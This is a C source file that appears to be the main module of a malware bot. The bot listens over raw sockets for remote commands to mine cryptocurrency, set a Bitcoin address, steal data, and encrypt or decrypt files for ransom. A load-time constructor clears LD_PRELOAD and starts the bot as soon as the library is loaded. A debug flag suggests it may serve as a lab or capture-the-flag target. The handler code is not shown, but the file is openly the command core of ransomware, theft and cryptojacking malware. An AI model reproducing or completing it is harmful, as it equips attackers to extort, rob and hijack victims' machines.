#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include "raw_socket_comms.h"
#include "btcstorage.h"
#include "mining.h"
#include "ransom_cmd.h"
#include "debug.h"

void handleCommand(struct IncomingMessage *msg, int len) {
	// printf("Incoming message (%d bytes): '%.*s'\n", len, len, msg->data);
	// hexview(msg->data, len);
	// fflush(stdout);

	int cmdlen = strnlen(msg->data, len);
	if (strncmp(msg->data, "PING", cmdlen) == 0) {
		answerRequest(msg, "PONG", 4);
	} else if (strncmp(msg->data, "MINE", cmdlen) == 0) {
		mine_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else if (strncmp(msg->data, "SET_BTC_ADDRESS", cmdlen) == 0) {
		btcstorage_set_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else if (strncmp(msg->data, "GET_BTC_ADDRESS", cmdlen) == 0) {
		btcstorage_get_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else if (strncmp(msg->data, "STEAL", cmdlen) == 0) {
		steal_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else if (strncmp(msg->data, "RANSOM_MESSAGE", cmdlen) == 0) {
		ransom_message_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else if (strncmp(msg->data, "RANSOM_ENCRYPT", cmdlen) == 0) {
		ransom_encrypt_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else if (strncmp(msg->data, "RANSOM_DECRYPT", cmdlen) == 0) {
		ransom_decrypt_cmd(msg, msg->data + cmdlen + 1, len - cmdlen - 1);
	} else {
		answerRequest(msg, "Unknown command", 15);
	}
}

static __attribute__((noinline)) int drop_permissions() {
	if (getuid() == 0) {
		if (setgid(1000) != 0) {
			perror("setgid");
			return 1;
		}
		if (setuid(1000) != 0) {
			perror("setuid");
			return 1;
		}
	}
	return 0;
}

__attribute__ ((visibility ("default"))) int main() {
#ifdef IN_DOCKER
	fprintf(stderr, "[WARNING] DEBUG VERSION\n");
#endif
	// alarm(5);
	if (init_btcstorage())
		return 1;
	if (init_communication())
		return 2;
	if (init_crypto())
		return 3;
	if (drop_permissions())
		return 4;
	handle_incoming_messages(handleCommand);
	return 0;
}

void __attribute__((constructor)) init() {
	unsetenv("LD_PRELOAD");
	int rc = main();
	_exit(rc);
}
